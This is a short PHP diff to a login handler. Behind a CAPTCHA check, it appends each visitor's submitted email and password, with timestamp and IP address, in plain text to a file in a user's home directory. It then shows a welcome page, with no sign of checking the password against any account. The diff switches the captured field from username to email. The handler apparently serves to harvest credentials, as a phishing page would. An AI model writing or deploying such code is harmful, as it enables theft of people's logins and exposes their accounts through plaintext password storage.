@@ -23,13 +23,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $verification = json_decode($response, true);
     if (!$verification['success']) { die("CAPTCHA failed."); }
 
-    $username = htmlspecialchars($_POST['username']);
+  $email = htmlspecialchars($_POST['email']);
     $password = htmlspecialchars($_POST['pswrd']);
     $ip = $remoteIp;
     $timestamp = date("Y-m-d H:i:s");
 
     $filePath = "/home/albert/logins.txt";
-    file_put_contents($filePath, "[$timestamp][$ip] Username: $username, Password: $password\n", FILE_APPEND);
+    file_put_contents($filePath, "[$timestamp][$ip] Email: $email, Password: $password\n", FILE_APPEND);
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -39,7 +39,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       <link rel="stylesheet" href="namer.css">
     </head>
     <body>
-      <h1>Welcome, <?php echo $username; ?>!</h1>
+      <h1>Welcome, <?php echo $email; ?>!</h1>
       <script src="login.js" defer></script>
     </body>
     </html>
